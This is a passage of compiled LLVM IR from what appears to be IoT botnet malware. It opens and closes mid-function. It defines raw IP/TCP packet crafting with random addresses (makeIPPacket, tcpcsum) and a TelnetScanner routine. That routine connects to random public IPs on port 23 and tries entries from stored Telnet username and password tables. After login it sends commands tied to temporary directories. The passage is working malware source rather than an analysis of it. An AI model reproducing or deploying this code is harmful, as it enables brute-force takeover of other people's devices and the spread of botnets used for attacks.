  %45 = icmp eq i8 %33, 100
  %or.cond32 = and i1 %or.cond30, %45
  br i1 %or.cond32, label %.critedge.backedge, label %46

; <label>:46:                                     ; preds = %43
  %47 = icmp eq i8 %14, -53
  %or.cond34 = and i1 %47, %34
  %48 = icmp eq i8 %33, 113
  %or.cond36 = and i1 %or.cond34, %48
  %49 = icmp ugt i8 %14, -33
  %or.cond38 = or i1 %49, %or.cond36
  br i1 %or.cond38, label %.critedge.backedge, label %50

; <label>:50:                                     ; preds = %46
  %51 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %51, i8 0, i64 16, i32 16, i1 false)
  %52 = zext i8 %14 to i32
  %53 = zext i8 %36 to i32
  %54 = zext i8 %33 to i32
  %55 = and i32 %12, 255
  %56 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %51, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.263, i64 0, i64 0), i32 %52, i32 %53, i32 %54, i32 %55)
  %57 = call i32 @inet_addr(i8* nonnull %51) #7
  ret i32 %57
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #15
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv33 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv33, 4
  br i1 %min.iters.check, label %.lr.ph16.preheader34, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph16.preheader
  %8 = zext i32 %addconv33 to i64
  %9 = and i32 %addconv33, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end27 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph16.preheader34, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi28 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load31 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load31 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi28
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !16

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx32 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx32, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge17.loopexit, label %.lr.ph16.preheader34

.lr.ph16.preheader34:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph16.preheader
  %.014.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph16.preheader ], [ %19, %middle.block ]
  %.0913.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph16.preheader ], [ %ind.end, %middle.block ]
  %.01012.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph16.preheader ], [ %ind.end27, %middle.block ]
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16.preheader34, %.lr.ph16
  %.014 = phi i64 [ %23, %.lr.ph16 ], [ %.014.ph, %.lr.ph16.preheader34 ]
  %.0913 = phi i32 [ %24, %.lr.ph16 ], [ %.0913.ph, %.lr.ph16.preheader34 ]
  %.01012 = phi i16* [ %20, %.lr.ph16 ], [ %.01012.ph, %.lr.ph16.preheader34 ]
  %20 = getelementptr inbounds i16, i16* %.01012, i64 1
  %21 = load i16, i16* %.01012, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.014
  %24 = add nsw i32 %.0913, -2
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %.lr.ph16, label %._crit_edge17.loopexit.loopexit, !llvm.loop !17

._crit_edge17.loopexit.loopexit:                  ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %._crit_edge17.loopexit.loopexit, %middle.block
  %.lcssa25 = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge17.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa25, %._crit_edge17.loopexit ]
  %27 = icmp eq i32 %.09.lcssa, 1
  br i1 %27, label %28, label %.preheader

; <label>:28:                                     ; preds = %._crit_edge17
  %29 = bitcast i16* %.010.lcssa to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = add i64 %31, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %28, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %32, %28 ]
  %33 = lshr i64 %.1.ph, 16
  %34 = icmp eq i64 %33, 0
  br i1 %34, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %35 = phi i64 [ %38, %.lr.ph ], [ %33, %.lr.ph.preheader ]
  %.111 = phi i64 [ %37, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %36 = and i64 %.111, 65535
  %37 = add nuw nsw i64 %36, %35
  %38 = lshr i64 %37, 16
  %39 = icmp eq i64 %38, 0
  br i1 %39, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %37, %._crit_edge.loopexit ]
  %40 = trunc i64 %.1.lcssa to i16
  %41 = xor i16 %40, -1
  ret i16 %41
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = bitcast i32* %3 to <2 x i32>*
  %5 = load <2 x i32>, <2 x i32>* %4, align 4
  %6 = zext <2 x i32> %5 to <2 x i64>
  %7 = tail call zeroext i16 @htons(i16 zeroext 20) #15
  %8 = tail call noalias i8* @malloc(i64 44) #7
  %9 = bitcast i8* %8 to i16*
  %10 = bitcast i8* %8 to <2 x i64>*
  store <2 x i64> %6, <2 x i64>* %10, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %8, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %8, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %8, i64 18
  %11 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %7, i16* %11, align 1
  %12 = getelementptr inbounds i8, i8* %8, i64 24
  %13 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %12, i8* %13, i64 20, i32 1, i1 false)
  %14 = tail call zeroext i16 @csum(i16* %9, i32 44)
  tail call void @free(i8* %8) #7
  ret i16 %14
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #4 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #7
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline noreturn nounwind uwtable
define void @TelnetScanner(i32, i32) local_unnamed_addr #11 {
  %3 = alloca %struct.fd_set, align 8
  %4 = alloca %struct.timeval, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = tail call i32 @getdtablesize() #7
  %9 = add nsw i32 %8, -100
  %10 = icmp sgt i32 %9, %1
  %. = select i1 %10, i32 %1, i32 %9
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call zeroext i16 @htons(i16 zeroext 23) #15
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %12, i16* %13, align 2
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %15 = bitcast i8* %14 to i64*
  store i64 0, i64* %15, align 4
  %16 = tail call noalias i8* @malloc(i64 1025) #7
  tail call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 1025, i32 1, i1 false)
  %17 = zext i32 %. to i64
  %18 = alloca %struct.telstate_t, i64 %17, align 16
  %19 = bitcast %struct.telstate_t* %18 to i8*
  %20 = sext i32 %. to i64
  %21 = mul nsw i64 %20, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %19, i8 0, i64 %21, i32 16, i1 false)
  %22 = icmp sgt i32 %., 0
  br i1 %22, label %.lr.ph174.preheader, label %.preheader169

.lr.ph174.preheader:                              ; preds = %2
  %xtraiter = and i64 %20, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph174.prol.loopexit, label %.lr.ph174.prol.preheader

.lr.ph174.prol.preheader:                         ; preds = %.lr.ph174.preheader
  br label %.lr.ph174.prol

.lr.ph174.prol:                                   ; preds = %.lr.ph174.prol.preheader
  %23 = bitcast %struct.telstate_t* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %23, i8 0, i64 32, i32 16, i1 false)
  %24 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 0, i32 3
  store i8 1, i8* %24, align 1
  %25 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 0, i32 9
  store i8* %16, i8** %25, align 8
  br label %.lr.ph174.prol.loopexit

.lr.ph174.prol.loopexit:                          ; preds = %.lr.ph174.preheader, %.lr.ph174.prol
  %indvars.iv177.unr = phi i64 [ 0, %.lr.ph174.preheader ], [ 1, %.lr.ph174.prol ]
  %26 = icmp eq i32 %., 1
  br i1 %26, label %.preheader169.loopexit, label %.lr.ph174.preheader.new

.lr.ph174.preheader.new:                          ; preds = %.lr.ph174.prol.loopexit
  br label %.lr.ph174

.preheader169.loopexit.unr-lcssa:                 ; preds = %.lr.ph174
  br label %.preheader169.loopexit

.preheader169.loopexit:                           ; preds = %.lr.ph174.prol.loopexit, %.preheader169.loopexit.unr-lcssa
  br label %.preheader169

.preheader169:                                    ; preds = %.preheader169.loopexit, %2
  %27 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %28 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 0
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 1
  br label %.loopexit

.lr.ph174:                                        ; preds = %.lr.ph174, %.lr.ph174.preheader.new
  %indvars.iv177 = phi i64 [ %indvars.iv177.unr, %.lr.ph174.preheader.new ], [ %indvars.iv.next178.1, %.lr.ph174 ]
  %30 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv177
  %31 = bitcast %struct.telstate_t* %30 to i8*
  call void @llvm.memset.p0i8.i64(i8* %31, i8 0, i64 32, i32 16, i1 false)
  %32 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv177, i32 3
  store i8 1, i8* %32, align 1
  %33 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv177, i32 9
  store i8* %16, i8** %33, align 8
  %indvars.iv.next178 = add nuw nsw i64 %indvars.iv177, 1
  %34 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv.next178
  %35 = bitcast %struct.telstate_t* %34 to i8*
  call void @llvm.memset.p0i8.i64(i8* %35, i8 0, i64 32, i32 16, i1 false)
  %36 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv.next178, i32 3
  store i8 1, i8* %36, align 1
  %37 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv.next178, i32 9
  store i8* %16, i8** %37, align 8
  %indvars.iv.next178.1 = add nsw i64 %indvars.iv177, 2
  %38 = icmp slt i64 %indvars.iv.next178.1, %20
  br i1 %38, label %.lr.ph174, label %.preheader169.loopexit.unr-lcssa

.loopexit:                                        ; preds = %.loopexit, %.preheader169
  br i1 %22, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %40 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 0
  %41 = sext i32 %0 to i64
  %42 = bitcast i32* %6 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %480, %.lr.ph.preheader
  %.1172 = phi i32 [ %.mux, %480 ], [ 0, %.lr.ph.preheader ]
  %43 = sext i32 %.1172 to i64
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 7
  %46 = load i32, i32* %45, align 16
  %47 = icmp eq i32 %46, 0
  br i1 %47, label %48, label %51

; <label>:48:                                     ; preds = %.lr.ph
  %49 = call i64 @time(i64* null) #7
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %45, align 16
  br label %51

; <label>:51:                                     ; preds = %48, %.lr.ph
  %52 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 2
  %53 = load i8, i8* %52, align 8
  switch i8 %53, label %480 [
    i8 0, label %59
    i8 1, label %100
    i8 2, label %133
    i8 3, label %155
    i8 4, label %167
    i8 5, label %189
    i8 6, label %201
    i8 7, label %246
    i8 8, label %.preheader
    i8 9, label %259
    i8 10, label %266
    i8 11, label %279
    i8 12, label %286
    i8 13, label %309
    i8 14, label %333
    i8 15, label %357
    i8 16, label %464
  ]

.preheader:                                       ; preds = %51
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 0, i32 0
  %55 = load i32, i32* %54, align 16
  %56 = load i8*, i8** getelementptr inbounds ([6 x i8*], [6 x i8*]* @tmp_dirs, i64 0, i64 0), align 16
  %57 = call i32 (i32, i8*, ...) @sockprintf(i32 %55, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.279, i64 0, i64 0), i8* %56, i8* %56)
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %253, label %254

; <label>:59:                                     ; preds = %51
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 3
  %61 = load i8, i8* %60, align 1
  switch i8 %61, label %81 [
    i8 1, label %62
    i8 0, label %69
  ]

; <label>:62:                                     ; preds = %59
  %63 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 9
  %64 = bitcast i8** %63 to i64*
  %65 = load i64, i64* %64, align 8
  %66 = bitcast %struct.telstate_t* %44 to i8*
  call void @llvm.memset.p0i8.i64(i8* %66, i8 0, i64 32, i32 16, i1 false)
  store i64 %65, i64* %64, align 8
  %67 = call i32 @getRandomPublicIP()
  %68 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 1
  store i32 %67, i32* %68, align 4
  br label %81

; <label>:69:                                     ; preds = %59
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 4
  %71 = load i8, i8* %70, align 2
  %72 = add i8 %71, 1
  store i8 %72, i8* %70, align 2
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 5
  %74 = load i8, i8* %73, align 1
  %75 = add i8 %74, 1
  store i8 %75, i8* %73, align 1
  %76 = icmp eq i8 %75, 19
  br i1 %76, label %77, label %78

; <label>:77:                                     ; preds = %69
  store i8 1, i8* %60, align 1
  br label %480

; <label>:78:                                     ; preds = %69
  %79 = icmp eq i8 %72, 19
  br i1 %79, label %80, label %81

; <label>:80:                                     ; preds = %78
  store i8 1, i8* %60, align 1
  br label %480

; <label>:81:                                     ; preds = %59, %78, %62
  store i16 2, i16* %11, align 4
  store i16 %12, i16* %13, align 2
  store i64 0, i64* %15, align 4
  %82 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 1
  %83 = load i32, i32* %82, align 4
  store i32 %83, i32* %39, align 4
  %84 = call i32 @socket(i32 2, i32 1, i32 0) #7
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 0, i32 0
  store i32 %84, i32* %85, align 16
  %86 = icmp eq i32 %84, -1
  br i1 %86, label %480, label %87

; <label>:87:                                     ; preds = %81
  %88 = call i32 (i32, i32, ...) @fcntl(i32 %84, i32 3, i8* null) #7
  %89 = or i32 %88, 2048
  %90 = call i32 (i32, i32, ...) @fcntl(i32 %84, i32 4, i32 %89) #7
  %91 = load i32, i32* %85, align 16
  %92 = call i32 @connect(i32 %91, %struct.sockaddr* nonnull %27, i32 16) #7
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %99

; <label>:94:                                     ; preds = %87
  %95 = tail call i32* @__errno_location() #15
  %96 = load i32, i32* %95, align 4
  %97 = icmp eq i32 %96, 115
  br i1 %97, label %99, label %98

; <label>:98:                                     ; preds = %94
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %480

; <label>:99:                                     ; preds = %94, %87
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 1)
  br label %480

; <label>:100:                                    ; preds = %51
  %101 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %40) #7, !srcloc !19
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 0, i32 0
  %103 = load i32, i32* %102, align 16
  %104 = srem i32 %103, 64
  %105 = zext i32 %104 to i64
  %106 = shl i64 1, %105
  %107 = sdiv i32 %103, 64
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 %108
  %110 = load i64, i64* %109, align 8
  %111 = or i64 %106, %110
  store i64 %111, i64* %109, align 8
  store i64 0, i64* %28, align 8
  store i64 %41, i64* %29, align 8
  %112 = add nsw i32 %103, 1
  %113 = call i32 @select(i32 %112, %struct.fd_set* null, %struct.fd_set* nonnull %3, %struct.fd_set* null, %struct.timeval* nonnull %4) #7
  switch i32 %113, label %126 [
    i32 1, label %114
    i32 -1, label %125
  ]

; <label>:114:                                    ; preds = %100
  store i32 0, i32* %45, align 16
  store i32 4, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %115 = load i32, i32* %102, align 16
  %116 = call i32 @getsockopt(i32 %115, i32 1, i32 4, i8* nonnull %42, i32* nonnull %5) #7
  %117 = load i32, i32* %6, align 4
  %118 = icmp eq i32 %117, 0
  br i1 %118, label %120, label %119

; <label>:119:                                    ; preds = %114
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %480

; <label>:120:                                    ; preds = %114
  %121 = load i32, i32* %102, align 16
  %122 = call i32 (i32, i32, ...) @fcntl(i32 %121, i32 3, i8* null) #7
  %123 = and i32 %122, -2049
  %124 = call i32 (i32, i32, ...) @fcntl(i32 %121, i32 4, i32 %123) #7
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 2)
  br label %480

; <label>:125:                                    ; preds = %100
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %480

; <label>:126:                                    ; preds = %100
  %127 = load i32, i32* %45, align 16
  %128 = add i32 %127, 7
  %129 = zext i32 %128 to i64
  %130 = call i64 @time(i64* null) #7
  %131 = icmp slt i64 %129, %130
  br i1 %131, label %132, label %480

; <label>:132:                                    ; preds = %126
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %480

; <label>:133:                                    ; preds = %51
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 0, i32 0
  %135 = load i32, i32* %134, align 16
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 9
  %137 = load i8*, i8** %136, align 8
  %138 = call i32 @read_until_response(i32 %135, i32 %0, i8* %137, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i64 0, i64 0))
  %139 = icmp eq i32 %138, 0
  br i1 %139, label %148, label %140

; <label>:140:                                    ; preds = %133
  %141 = call i64 @time(i64* null) #7
  %142 = trunc i64 %141 to i32
  store i32 %142, i32* %45, align 16
  %143 = load i8*, i8** %136, align 8
  %144 = call i32 @contains_fail(i8* %143)
  %145 = icmp eq i32 %144, 0
  br i1 %145, label %147, label %146

; <label>:146:                                    ; preds = %140
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 0)
  br label %480

; <label>:147:                                    ; preds = %140
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 3)
  br label %480

; <label>:148:                                    ; preds = %133
  %149 = load i32, i32* %45, align 16
  %150 = add i32 %149, 7
  %151 = zext i32 %150 to i64
  %152 = call i64 @time(i64* null) #7
  %153 = icmp slt i64 %151, %152
  br i1 %153, label %154, label %480

; <label>:154:                                    ; preds = %148
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %480

; <label>:155:                                    ; preds = %51
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 0, i32 0
  %157 = load i32, i32* %156, align 16
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 4
  %159 = load i8, i8* %158, align 2
  %160 = zext i8 %159 to i64
  %161 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %160
  %162 = load i8*, i8** %161, align 8
  %163 = call i32 (i32, i8*, ...) @sockprintf(i32 %157, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.276, i64 0, i64 0), i8* %162)
  %164 = icmp slt i32 %163, 0
  br i1 %164, label %165, label %166

; <label>:165:                                    ; preds = %155
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %480

; <label>:166:                                    ; preds = %155
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 4)
  br label %480

; <label>:167:                                    ; preds = %51
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 0, i32 0
  %169 = load i32, i32* %168, align 16
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 9
  %171 = load i8*, i8** %170, align 8
  %172 = call i32 @read_until_response(i32 %169, i32 %0, i8* %171, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i64 0, i64 0))
  %173 = icmp eq i32 %172, 0
  br i1 %173, label %182, label %174

; <label>:174:                                    ; preds = %167
  %175 = call i64 @time(i64* null) #7
  %176 = trunc i64 %175 to i32
  store i32 %176, i32* %45, align 16
  %177 = load i8*, i8** %170, align 8
  %178 = call i32 @contains_fail(i8* %177)
  %179 = icmp eq i32 %178, 0
  br i1 %179, label %181, label %180

; <label>:180:                                    ; preds = %174
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 0)
  br label %480

; <label>:181:                                    ; preds = %174
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 5)
  br label %480

; <label>:182:                                    ; preds = %167
  %183 = load i32, i32* %45, align 16
  %184 = add i32 %183, 7
  %185 = zext i32 %184 to i64
  %186 = call i64 @time(i64* null) #7
  %187 = icmp slt i64 %185, %186
  br i1 %187, label %188, label %480

; <label>:188:                                    ; preds = %182
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %480

; <label>:189:                                    ; preds = %51
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 0, i32 0
  %191 = load i32, i32* %190, align 16
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 5
  %193 = load i8, i8* %192, align 1
  %194 = zext i8 %193 to i64
  %195 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %194
  %196 = load i8*, i8** %195, align 8
  %197 = call i32 (i32, i8*, ...) @sockprintf(i32 %191, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.276, i64 0, i64 0), i8* %196)
  %198 = icmp slt i32 %197, 0
  br i1 %198, label %199, label %200

; <label>:199:                                    ; preds = %189
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %480

; <label>:200:                                    ; preds = %189
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 6)
  br label %480

; <label>:201:                                    ; preds = %51
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 0, i32 0
  %203 = load i32, i32* %202, align 16
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 9
  %205 = load i8*, i8** %204, align 8
  %206 = call i32 @read_until_response(i32 %203, i32 %0, i8* %205, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i64 0, i64 0))
  %207 = icmp eq i32 %206, 0
  br i1 %207, label %239, label %208

; <label>:208:                                    ; preds = %201
  %209 = call i64 @time(i64* null) #7
  %210 = trunc i64 %209 to i32
  store i32 %210, i32* %45, align 16
  %211 = load i8*, i8** %204, align 8
  %212 = call i32 @contains_fail(i8* %211)
  %213 = icmp eq i32 %212, 0
  br i1 %213, label %215, label %214

; <label>:214:                                    ; preds = %208
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 0)
  br label %480

; <label>:215:                                    ; preds = %208
